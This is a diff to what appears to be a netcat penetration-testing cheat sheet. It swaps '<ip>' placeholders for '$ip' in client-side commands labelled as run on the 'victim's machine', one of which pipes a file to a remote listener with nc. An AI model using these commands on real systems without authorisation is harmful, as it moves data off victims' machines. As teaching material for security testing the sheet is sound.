@@ -63,7 +63,7 @@ nc -lvp <port>
 On the client side (victim's machine):
 
 ```bash
-echo “hello” | nc -v <ip> <port>
+echo “hello” | nc -v $ip <port>
 ```
 
 ###  Transfer data and save it in a file with netcat
@@ -78,7 +78,7 @@ nc -lvp <port> > received.txt
 On the client side (victim's machine):
 
 ```bash
-cat tobesentfiel.txt | nc -v <ip> <port>
+cat tobesentfiel.txt | nc -v $ip <port>
 ```
 
 
